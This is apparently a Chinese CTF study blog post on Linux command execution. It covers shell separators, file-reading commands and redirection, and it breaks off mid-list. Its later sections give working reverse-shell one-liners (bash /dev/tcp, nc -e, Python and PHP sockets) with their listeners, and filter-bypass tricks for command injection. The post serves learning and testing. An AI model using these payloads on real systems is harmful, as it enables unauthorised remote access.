    
    
    
    <entry>
      <title>对linux 命令执行的总结</title>
      <link href="/2020/09/10/%E5%AF%B9linux%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%80%BB%E7%BB%93/"/>
      <url>/2020/09/10/%E5%AF%B9linux%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>最近ctf 貌似对 RCE(远程命令执行)的要求明显提高，最后一步都是考一些关于反弹shell或远程执行某文件并知晓返回结果。然后，这些本linux命令就掌握不够好的菜鸡，雪上加霜。故写下此文来记录下（顺便也方便健忘的我来记忆下(눈_눈)）</p><a id="more"></a><h2 id="linux命令分割符"><a href="#linux命令分割符" class="headerlink" title="linux命令分割符"></a>linux命令分割符</h2><p>用linux命令时候,我们想用一行来执行多条命令时我们可以用命令分割符来操作。</p><h3 id="‘-’符号"><a href="#‘-’符号" class="headerlink" title="‘;’符号"></a>‘;’符号</h3><p>用;号隔开每个命令, 每个命令按照从左到右的顺序,顺序执行， 彼此之间不关心是否失败， 所有命令都会执行.用法:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command1 ; command2</span><br></pre></td></tr></table></figure><p>zzzz</p><h3 id="单’-’符号"><a href="#单’-’符号" class="headerlink" title="单’|’符号"></a>单’|’符号</h3><p>Linux所提供的管道符“|”将两个命令隔开，管道符左边命令的输出就会作为管道符右边命令的输入。连续使用管道意味着第一个命令的输出会作为 第二个命令的输入，第二个命令的输出又会作为第三个命令的输入，依此类推.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command1 | command2</span><br></pre></td></tr></table></figure><p><img src="image-20200622144120300.png" alt="&#39;|&#39;与&#39;;&#39;不管前面命令对错"></p><p>‘;’与’|’的对比:</p><p><img src="image-20200622143338964.png" alt="&#39;;&#39;与&#39;|&#39;的对比"></p><h3 id="单’-amp-’符号"><a href="#单’-amp-’符号" class="headerlink" title="单’&amp;’符号"></a>单’&amp;’符号</h3><p>默认情况下，我们命令行执行的进程是前台进程，这时就把Shell给占据了，我们无法进行其他操作，对于那些没有交互的进程，很多时候，我们希望将其在后台启动，可以在启动参数的时候加一个’&amp;’实现这个目的。用法:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command1 &amp; command2      #commond1 命令将会在后台进行</span><br></pre></td></tr></table></figure><p><img src="image-20200622145756840.png" alt="image-20200622145756840"></p><p>对比上图，可见 ‘&amp;’前面的‘ping 127.0.0.1 ’在后端运行：<img src="image-20200622150420815.png" alt="image-20200622150420815"></p><p>另外’&amp;’也是可以套娃使用的：</p><p><img src="image-20200622150115265.png" alt="image-20200622150115265"></p><p>‘&amp;’与’;’的对比:’;’是死板的从左到右,’&amp;’是将右边的放入后台执行:<img src="image-20200622145010295.png" alt="&#39;&amp;&#39;与&#39;;&#39;的对比"></p><h3 id="双’-amp-’符号（’-amp-amp-’）"><a href="#双’-amp-’符号（’-amp-amp-’）" class="headerlink" title="双’&amp;’符号（’&amp;&amp;’）"></a>双’&amp;’符号（’&amp;&amp;’）</h3><p>与c语言的’&amp;&amp;’类似，’&amp;&amp;’表时逻辑且的意思。只有在 &amp;&amp; 左边的命令返回真（命令返回值 $? == 0），&amp;&amp; 右边的命令才会被执行。用法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command1 &amp;&amp; command2</span><br></pre></td></tr></table></figure><p>示例：</p><p><img src="image-20200622152136058.png" alt="image-20200622152136058"></p><h3 id="双’-’符号（’-’）"><a href="#双’-’符号（’-’）" class="headerlink" title="双’|’符号（’||’）"></a>双’|’符号（’||’）</h3><p>与’&amp;&amp;’相反，’||’表示逻辑或的意思。只有在 || 左边的命令返回假，|| 右边的命令才会被执行。这和 c 语言中的逻辑或语法功能相同，即实现短路逻辑或操作。</p><p>用法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command1 || command2</span><br></pre></td></tr></table></figure><p>示例：</p><p><img src="image-20200622152447856.png" alt="image-20200622152447856"></p><h2 id="linux-常用操作"><a href="#linux-常用操作" class="headerlink" title="linux 常用操作"></a>linux 常用操作</h2><h3 id="1-读取文件操作"><a href="#1-读取文件操作" class="headerlink" title="1.读取文件操作"></a>1.读取文件操作</h3><h4 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h4><p>由第一行开始显示内容，并将所有内容输出.</p><p><img src="image-20200622162700725.png" alt="image-20200622162700725"></p><h4 id="tac"><a href="#tac" class="headerlink" title="tac"></a>tac</h4><p>从最后一行倒序显示内容，并将所有内容输出.</p><p><img src="image-20200622162755109.png" alt="image-20200622162755109"></p><h4 id="more"><a href="#more" class="headerlink" title="more"></a>more</h4><p>根据窗口大小，一页一页的现实文件内容.</p><p>可加<code>-数字</code> 一次显示的行数。<code>+数字</code>设置从第几行开始查看。</p><p><img src="image-20200622162907402.png" alt="image-20200622162907402"></p><h4 id="head"><a href="#head" class="headerlink" title="head"></a>head</h4><p>只显示头几行。</p><p>可加<code>-c</code> 设置一次显示的字符数。<code>-n</code>设置从显示行数。</p><p><img src="image-20200622164213205.png" alt="image-20200622164213205"></p><h4 id="tail"><a href="#tail" class="headerlink" title="tail"></a>tail</h4><p>只显示最后几行。</p><p>可加<code>-c</code> 设置一次显示的字符数。<code>-n</code>设置从显示行数。</p><p><img src="image-20200622164428116.png" alt="image-20200622164428116"></p><h4 id="nl"><a href="#nl" class="headerlink" title="nl"></a>nl</h4><p>类似于cat -n，显示时输出行号。</p><p><img src="image-20200622164512469.png" alt="image-20200622164512469"></p><h4 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h4><p>sort 命令默认用法也有读取文件的作用。</p><p><img src="image-20200622164715443.png" alt="image-20200622164715443"></p><h4 id="paste"><a href="#paste" class="headerlink" title="paste"></a>paste</h4><p>在合并文件的同时也会输出文件的内容。（可以只传一个文件名）</p><p><img src="image-20200622165446051.png" alt="image-20200622165446051"></p><h4 id="diff"><a href="#diff" class="headerlink" title="diff"></a>diff</h4><p>diff在对比两个文件后，会将两个文件输出。</p><p><img src="image-20200622165541111.png" alt="image-20200622165541111"></p><h4 id="od"><a href="#od" class="headerlink" title="od"></a>od</h4><p>od指令会读取所给予的文件的内容，并将其内容以八进制字码呈现出来。</p><p>我们可以通过 -a、 -c、 -ta 、-tc 选项将其转为可见字符显示出来。</p><p><img src="image-20200622170027751.png" alt="image-20200622170027751"></p><h4 id="bzmore"><a href="#bzmore" class="headerlink" title="bzmore"></a>bzmore</h4><p>bzmore将bzip压缩过的文件解压到标准输出，同时也可以将普通文件显示到标准输出。</p><p><img src="image-20200622170430842.png" alt="image-20200622170430842"></p><h4 id="less"><a href="#less" class="headerlink" title="less"></a>less</h4><p>more类似，但其优点可以往前翻页，而且进行可以搜索字符。在默认情况下翻页。</p><p>我们反引号来进行指令替代（以某一个指令的输出结果作为另一个指令的输入项）</p><p>例如下：</p><p><img src="image-20200622170910160.png" alt="image-20200622170910160"></p><h4 id="bzless"><a href="#bzless" class="headerlink" title="bzless"></a>bzless</h4><p>增强“.bz2”压缩包查看器，bzless比bzmore命令功能更加强大。在默认情况下翻页。</p><p>我们同样可以用反引号来进行指令替代</p><p><img src="image-20200622170834302.png" alt="image-20200622170834302"></p><h4 id="m4"><a href="#m4" class="headerlink" title="m4"></a>m4</h4><p>m4 将输入拷贝到输出,同时将宏展开. 宏可以是内嵌的也可以是用户定义的。</p><p> 使用方法:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m4 filename</span><br></pre></td></tr></table></figure><h4 id="strings"><a href="#strings" class="headerlink" title="strings"></a>strings</h4><p>strings命令是Linux中一个强大的工具,用于从二进制文件中提取可打印的字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lexsd6@lexsd6-virtual-machine:~$ strings &#x2F;flag</span><br><span class="line">flag&#123;this_is_test&#125;</span><br></pre></td></tr></table></figure><h4 id="uniq"><a href="#uniq" class="headerlink" title="uniq"></a>uniq</h4><p>Linux uniq 命令用于检查及删除文本文件中重复出现的行列, 然后输出。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lexsd6@lexsd6-virtual-machine:~$ uniq &#x2F;flag</span><br><span class="line">flag&#123;this_is_test&#125;</span><br></pre></td></tr></table></figure><h4 id="pr"><a href="#pr" class="headerlink" title="pr"></a>pr</h4><p>pr 命令把指定文件写到标准输出。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">lexsd6@lexsd6-virtual-machine:~$ pr &#x2F;flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2023-01-03 20:20                      &#x2F;flag                       Page 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag&#123;this_is_test&#125;</span><br></pre></td></tr></table></figure><h4 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h4><p>curl 通过文件协议来读取文件。</p><p>curl file:///home/coffee/flag</p><h3 id="2-目录读取"><a href="#2-目录读取" class="headerlink" title="2.目录读取"></a>2.目录读取</h3><h4 id="ls-命令"><a href="#ls-命令" class="headerlink" title="ls 命令"></a>ls 命令</h4><p>ls 用于查看参数目录下的文件。</p><p>基本用法：ls  文件路径</p><h4 id="dir"><a href="#dir" class="headerlink" title="dir"></a>dir</h4><p>与ls类似，用于查看参数目录下的文件。基本 用法：dir  文件路径</p><h3 id="3-重定向与命令替换"><a href="#3-重定向与命令替换" class="headerlink" title="3.重定向与命令替换"></a>3.重定向与命令替换</h3><h4 id="I-O重定向"><a href="#I-O重定向" class="headerlink" title="I / O重定向"></a>I / O重定向</h4><p>I / O重定向通俗的讲就是就是我们平时用到的那些就是经典的输出重定向<code>&gt;</code>和输入重定向<code>&lt;</code>.</p><p>但如过要深入点了解I / O重定向，还需要了解<strong>文件描述符。</strong></p><h5 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h5><p>在linux中，每个打开的文件都分配有一个文件描述符。但会保留描述符1到9。其中0</p><p>、1、2是默认打开文件stdin， stdout和stderr的 文件描述符。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0  是stdin（键盘设备文件） 又称为标准输入 ，是我们从键盘输入信息所在的文件</span><br><span class="line">1  是stdout（屏幕设备文件）又称为标准输出，是linux的正常输出信息。</span><br><span class="line">2  是stderr（错误消息输出到屏幕设备文件）又称为标准错误输出，是linux的错误输出信息。</span><br></pre></td></tr></table></figure><p>如果还不理解stdout与stderr，看下下面这张图。</p><p><img src="image-20200624205408985.png" alt="image-20200624205408985"></p><p>在<code>cat aa 1&gt;sss</code>时<code>cat aa</code>的标准输出未打印在屏幕上，而是重定向输出在文件sss里。</p><p>在<code>cat aa 2&gt;sss</code>时<code>cat aa</code>并未报错，所以标准输出打印在屏幕上且sss中的文件为NULL。</p><p>在<code>cat lexs 2&gt;sss</code>时由于没有lexs文件<code>cat lexs</code>有报错但是未打印在屏幕上，而是重定向输出在文件sss里。</p><h5 id="输入重定向"><a href="#输入重定向" class="headerlink" title="输入重定向"></a>输入重定向</h5><p>输入重定向是指把命令（或可执行程序）的标准输入重定向到指定的文件中。也就是说，输入可以不来自键盘，而来自一个指定的文件。所以说，输入重定向主要用于改变一个命令的输入源，特别是改变那些需要大量输入的输入源。如下图：</p><p><img src="image-20200624220701709.png" alt="image-20200624220701709"></p><p>如果给出一个文件名作为wc命令的参数，wc将会返回该文件文件名。如过以输入重定向的方式作为wc命令的参数，wc不会会返回该文件文件名。</p><p>输入重定向常用命令有:<code>&lt;</code>与<code>&lt;&lt;</code>，<code>&lt;</code>与<code>&lt;&lt;</code>是有区别的：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> &lt;用法：</span><br><span class="line">command &lt; 文件 #等同于command 0&lt; 文件 把文件当成输入源</span><br><span class="line"></span><br><span class="line">&lt;&lt;用法：</span><br><span class="line">&lt;&lt; tag</span><br><span class="line"> </span><br><span class="line"> 内容</span><br><span class="line">tag</span><br></pre></td></tr></table></figure><h5 id="输出重定向"><a href="#输出重定向" class="headerlink" title="输出重定向"></a>输出重定向</h5><p>输出重定向是指把命令（或可执行程序）的标准输出或标准错误输出重新定向到指定文件中。这样，该命令的输出就不显示在屏幕上，而是写入到指定文件。</p><p><img src="image-20200625000121103.png" alt="image-20200625000121103"></p><p>输出重定向与输入重定向相比，操作与命令更加丰富：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">command &gt; 文件 </span><br><span class="line"><span class="meta">#</span><span class="bash"> 相当于<span class="built_in">command</span> 1&gt;文件 <span class="built_in">command</span>标准输出就不显示在屏幕上，而是写入到指定文件。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">这用法会覆盖文件里的内容</span></span><br><span class="line"></span><br><span class="line">command &gt;&gt; 文件 </span><br><span class="line"><span class="meta">#</span><span class="bash"> 相当于<span class="built_in">command</span> 1&gt;&gt;文件 <span class="built_in">command</span>标准输出就不显示在屏幕上，而是追加写入到指定文件。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">这用法不会覆盖文件里的内容</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">command 1&gt; 文件 </span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="built_in">command</span>标准输出就不显示在屏幕上，而是写入到指定文件。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">这用法会覆盖文件里的内容</span></span><br><span class="line"></span><br><span class="line">command 1&gt;&gt; 文件 </span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="built_in">command</span>标准输出就不显示在屏幕上，而是追加写入到指定文件。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">这用法不会覆盖文件里的内容</span></span><br><span class="line"></span><br><span class="line">command 2&gt; 文件 </span><br><span class="line"><span class="meta">#</span><span class="bash"> 相当于<span class="built_in">command</span> 2&gt;文件 <span class="built_in">command</span>报错输出就不显示在屏幕上，而是写入到指定文件。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">这用法会覆盖文件里的内容</span></span><br><span class="line"></span><br><span class="line">command 2&gt;&gt; 文件 </span><br><span class="line"><span class="meta">#</span><span class="bash"> 相当于<span class="built_in">command</span> 2&gt;&gt;文件 <span class="built_in">command</span>报错输出就不显示在屏幕上，而是追加写入到指定文件。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">这用法不会覆盖文件里的内容</span></span><br><span class="line"></span><br><span class="line">command &amp;&gt; 文件 </span><br><span class="line"><span class="meta">#</span><span class="bash"> 类似于<span class="built_in">command</span> 1&gt;文件  2&gt;文件 或<span class="built_in">command</span> 1&gt;文件  2&gt;1 </span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="built_in">command</span>标准输出与报错输出就不显示在屏幕上，而是写入到指定文件。</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 这用法不会覆盖文件里的内容</span></span><br><span class="line"></span><br><span class="line">command &amp;&gt;&gt; 文件 </span><br><span class="line"><span class="meta">#</span><span class="bash"> 类似于<span class="built_in">command</span> 1&gt;&gt;文件  2&gt;&gt;文件 或 <span class="built_in">command</span> 1&gt;&gt;文件  2&gt;&gt;1</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="built_in">command</span>标准输出与报错输出就不显示在屏幕上，而是追加写入到指定文件。</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 这用法会不会覆盖文件里的内容</span></span><br></pre></td></tr></table></figure><p>部分用法展示</p><p><img src="image-20200625001228017.png" alt="image-20200625001228017"></p><p>另外说一下,<code>&amp;&gt;</code>与<code>&gt;&amp;</code>都允许将标准输出（文件描述符1）和标准错误输出（文件描述符2）都重定向到的文件里.如下图所示：</p><p><img src="image-20200625131259850.png" alt="image-20200625131259850"></p><p>看似<code>&amp;&gt;</code>与<code>&gt;&amp;</code>一样,但如果重定向的是文件描述符时,两者这有点细微的:</p><p><img src="image-20200625125440515.png" alt="image-20200625125440515"></p><p>注意！在当前目录下,有个名为1的文件！！！</p><p>我们在执行<code>ls 1&amp;&gt;sss</code>时，<code>&amp;&gt;</code>把<code>ls 1</code>当成一条命令运行重定向到sss里。</p><p>相当于执行的是<code>(ls 1)   &amp;&gt;sss</code>。</p><p>我们在执行<code>ls 1&gt;&amp;sss</code>时，<code>&amp;&gt;</code>把<code>ls</code>当成一条命令运行重定向到sss里。</p><p>相当于执行的是<code>(ls)   1&amp;&gt;sss</code>。</p><h4 id="命令替换"><a href="#命令替换" class="headerlink" title="命令替换"></a>命令替换</h4><p>命令替换是指将命令的标准输出作为值赋给某个变量，bash Shell定义了两种形式进行命令的替换，两种形式的语法格式如下：  </p><p> 方式一：  `Linux命令` </p><p> 方式二： $（Linux命令） </p><p><img src="image-20200626001300485.png" alt="image-20200626001300485"></p><p> 注意：尽管$（）和反引号在命令替换上是等价的，但是，$（）形式的命令替换是可以嵌套的。</p><h3 id="4-反弹shell"><a href="#4-反弹shell" class="headerlink" title="4.反弹shell"></a>4.反弹shell</h3><h4 id="方法1：shell命令反弹"><a href="#方法1：shell命令反弹" class="headerlink" title="方法1：shell命令反弹"></a>方法1：shell命令反弹</h4><p>利用shell 命令来进行shell反弹.</p><p>在进攻机上执行监听命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp (port)   <span class="comment">#port 为监听的端口</span></span><br></pre></td></tr></table></figure><p>在被攻击机器上执行命令:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/(ip)/(port) 0&gt;&amp;1</span><br><span class="line"><span class="comment">#ip为攻击机ip地址 port 为攻击机上开放的端口</span></span><br></pre></td></tr></table></figure><p>（有些情况下bash可以用sh来代替。）</p><p>按自己的理解解释下这命令：</p><p><code>bash -i</code> 命令行的交互模式.</p><p><code>/dev/tcp/(ip)/(port)</code>指远程，也就是攻击机.</p><p>所以<code>bash -i &gt;&amp; /dev/tcp/(ip)/(port)</code>就是将命令行的交互的输出重定向( stdout和stderr)到攻击机.</p><p> <code>0&gt;&amp;1</code>将命令行的交互的输入重定向( stdin)到攻击机.</p><p><img src="image-20200627115610170.png" alt="image-20200627115610170"></p><p>效果展示:</p><p><img src="image-20200627120409808.png" alt="image-20200627120409808"></p><h4 id="方法2-利用nc反弹"><a href="#方法2-利用nc反弹" class="headerlink" title="方法2:利用nc反弹"></a>方法2:利用nc反弹</h4><p>使用nc反弹shell，被攻击机反弹shell命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash  ip   port    # ip   port指攻击机的ip与port</span><br></pre></td></tr></table></figure><p>攻击接听命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nlvp (port)   # port指攻击机的port</span><br></pre></td></tr></table></figure><p>nc监听端口反弹shell时都会有一个警告：Warning: forward host lookup failed for bogon: Unknown host,根据nc帮助文档的提示加上-n参数就可以不产生这个警告了，-n参数代表在建立连接之前不对主机进行dns解析。</p><p><img src="image-20200627171230472.png" alt="image-20200627171230472"></p><p>这里的-e后面跟的参数代表的是在创建连接后执行的程序，这里代表在连接到远程后可以在远程执行一个本地shell(/bin/bash)，也就是反弹一个shell给远程，可以看到远程已经成功反弹到了shell，并且可以执行命令。但弹了命令没有弹用户、位置及权限信息。</p><p>若-e 不能使用，可以利用到linux中的管道符。攻击机上开两个端口来监听。例如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 7777</span><br><span class="line"></span><br><span class="line">nc -nvlp 8888</span><br></pre></td></tr></table></figure><p>被攻击上执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.14.200 7777|/bin/bash|nc 192.168.14.200 8888</span><br></pre></td></tr></table></figure><p>这样在攻击机上一个端口发送命令一个端口接收回显。</p><p><img src="image-20200627174232125.png" alt="image-20200627174232125"></p><h4 id="方法3-利用python反弹"><a href="#方法3-利用python反弹" class="headerlink" title="方法3:利用python反弹"></a>方法3:利用python反弹</h4><p>使用python反弹，被攻击机反弹shell命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ip',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">ip port 为攻击机的端口</span></span><br></pre></td></tr></table></figure><p>在进攻机上执行监听命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp (port)   <span class="comment">#port 为监听的端口  可以在前面加个n</span></span><br></pre></td></tr></table></figure><p>下面来解释一下python反弹shell的原理。</p><p>首先使用socket与远程建立起连接，接下来使用到了os库的dup2()将标准输入、标准输出、标准错误输出重定向到远程，dup2()这个方法有两个参数，分别为文件描述符fd1和fd2，当fd2参数存在时，就关闭fd2，然后将fd1代表的那个文件强行复制给fd2。（可以理解成重定向的作用，fd2 &gt;&amp; fd1 ）.</p><p>s.fileno()是s的文件描述符，而s指代攻击机。所以s.fileno()就代表攻击机。</p><p>使用os.subprocess在本地开启一个子进程，传入参数“-i”使bash以交互模式启动，标准输入、标准输出、标准错误输出又被重定向到了s.fileno()(攻击机），这样的话就可以在攻击机远程执行输入命令了。</p><p>效果展示:</p><p><img src="image-20200627165202955.png" alt="image-20200627165202955"></p><h4 id="方法4-利用php反弹"><a href="#方法4-利用php反弹" class="headerlink" title="方法4:利用php反弹"></a>方法4:利用php反弹</h4><h5 id=""><a href="#" class="headerlink" title=""></a></h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r '$sock=fsockopen("ip",port);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span><br></pre></td></tr></table></figure><p>我们利用fsockopen函数建立socket连接攻击机。其中3代表的是使用fsockopen函数建立socket返回的文件描述符，然后将将标准输入，标准输出和标准错误输出都重定向到了3（攻击机）。</p><p>php关闭safe_mode这个选项，才可以使用exec函数。</p><h2 id="常见bypass"><a href="#常见bypass" class="headerlink" title="常见bypass"></a>常见bypass</h2><h3 id="敏感字符过滤绕过"><a href="#敏感字符过滤绕过" class="headerlink" title="敏感字符过滤绕过"></a>敏感字符过滤绕过</h3><h4 id="利用-符号"><a href="#利用-符号" class="headerlink" title="利用\符号"></a>利用<code>\</code>符号</h4><p><code>\</code>符号,会将两字符串拼成一个字符串来使用.例如下拼接cat</p><p><img src="image-20200622151501398.png" alt="image-20200622151501398"></p><p>在网页中，使用%0a(\n)，%0d(\r)，%09(\t)等字符也可以bypass</p><h4 id="利用特殊变量"><a href="#利用特殊变量" class="headerlink" title="利用特殊变量"></a>利用特殊变量</h4><p>在bash环境中，有些的特殊变量都是为空的.可以夹着关键字中绕过,如’fla$*g’可以绕过对’flag’的过滤.</p><p> 在可以使用的特殊变量有:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">* <span class="comment">#传递给脚本或函数的所有参数</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">@ <span class="comment">#传递给脚本或函数的所有参数</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">n <span class="comment">#传递给脚本或函数的第n个参数。n要求大于0(0表脚本或函数名),如大于一位数则要加括号,例如$&#123;11&#125;</span></span></span><br></pre></td></tr></table></figure><p>效果：</p><p><img src="image-20200627230932315.png" alt="image-20200627230932315"></p><p>按照我们理解特殊变量中‘传递给脚本或函数的参数’这个概念是指运行的一个函数or脚本内，所接受到的参数，然不是我们对一个将要运行的传递给脚本或函数的参数。如下：</p><p><img src="image-20200627225514904.png" alt="image-20200627225514904"></p><p>我们输出$0 看到的是bash，输出$<em>看到的是空，说明特殊变量指代的是bash这个脚本运行时的传递给*</em>这个（bash）脚本参数**而不是将要运行echo 的参数。</p><h4 id="使用变量"><a href="#使用变量" class="headerlink" title="使用变量"></a>使用变量</h4><p>我们可以通过变量，来分隔组合来进行一些绕过或者配合${}进行切片。</p><p>分隔组合：若ls 被禁，我们可以‘a=l ;b=s ;$a$b ’</p><p><img src="image-20200627235623856.png" alt="image-20200627235623856"></p><p>配合${} 切片：若ls 被禁，我们可以‘a=”12l23s”;b=${a:2:1}${a:5:1};$b ’</p><p><img src="image-20200627235921501.png" alt="image-20200627235921501"></p><h4 id="通配符-和-的使用"><a href="#通配符-和-的使用" class="headerlink" title="通配符*和?的使用"></a>通配符*和?的使用</h4><p>我们可以用于通配符*和?，来替换部分关键字。*可以匹配多个，？只能代替一个。</p><p><img src="image-20200628000212714.png" alt="image-20200628000212714"></p><p>同时,因为*和?优先匹配的下当前目录下的文件名:</p><p><img src="image-20200812224449425.png" alt="image-20200812224449425"></p><p>且在单独用通配符*时,bash会把匹配的第一个文件名当成命令,其余当成参数来执行:</p><p><img src="image-20200812225533013.png" alt="image-20200812225533013"></p><h4 id="和-的使用"><a href="#和-的使用" class="headerlink" title="[]和{}的使用"></a>[]和{}的使用</h4><p>用[]or{}在一个范围内进行替代。</p><p><img src="image-20200628000431773.png" alt="image-20200628000431773"></p><p>注意：[]和{}有点细微差别。</p><p><img src="image-20200628000634120.png" alt="image-20200628000634120"></p><h4 id="使用双引号和单引号"><a href="#使用双引号和单引号" class="headerlink" title="使用双引号和单引号"></a>使用双引号和单引号</h4><p>使用双引号和单引号，隔离拼接关键字来进行绕过。</p><p><img src="image-20200628001117125.png" alt="image-20200628001117125"></p><h4 id="使用编码"><a href="#使用编码" class="headerlink" title="使用编码"></a>使用编码</h4><p>可以用编码绕过的有点多，如：rot13，base64,16进制,8进制这里只提几种典型。</p><h5 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h5><p>可以解base64来绕过</p><p>例：<code>echo Y2F0IGFh|base64 -d|bash</code>（Y2F0IGFh解码为cat aa）</p><p><img src="image-20200628002338274.png" alt="image-20200628002338274"></p><h5 id="16进制编码"><a href="#16进制编码" class="headerlink" title="16进制编码"></a>16进制编码</h5><p>可以通过解16进制来绕过</p><p>例：<code>echo 6c73 | xxd -r -p|bash</code>（6c73解码为ls）</p><p><img src="image-20200628003502909.png" alt="image-20200628003502909"></p><p>例：<code>$(printf &#39;\x6c\x73&#39;)</code>（\6c\73解码为ls）ps：注意引号！</p><p><img src="image-20200628003629986.png" alt="image-20200628003629986"></p><h5 id="8进制"><a href="#8进制" class="headerlink" title="8进制"></a>8进制</h5><p>可以解8进制来绕过</p><p>例：<code>$(printf &#39;\154\163&#39;)</code> （\154\163解码为ls）</p><p><img src="image-20200628003127015.png" alt="image-20200628003127015"></p><h3 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h3><p>在空格被过滤后,如何分割传参是一个问题?我找到以下几个方法:</p><p>(1)  $IFS是linux shell 中的一种特殊的变量,默认条件下,IFS 的值，默认是 space, tab, newline这三个值在shell中都有分割参数的意思.但要注意的$IFS不能直接被shell识别,要${IFS}或$IFS$9提醒shell 是$IFS变量.</p><p>(2)利用输入重定向也是分割参数代替空格的好方法.</p><p><img src="image-20200628171815237.png" alt="image-20200628171815237"></p><p>(3)活用{}也能巧妙代替空格分离参数方法.</p><p><img src="image-20200628211605803.png" alt="image-20200628211605803"></p><p>(4) <code>%09</code> php 环境下的绕过</p><p>(5)<code>%0a</code>php 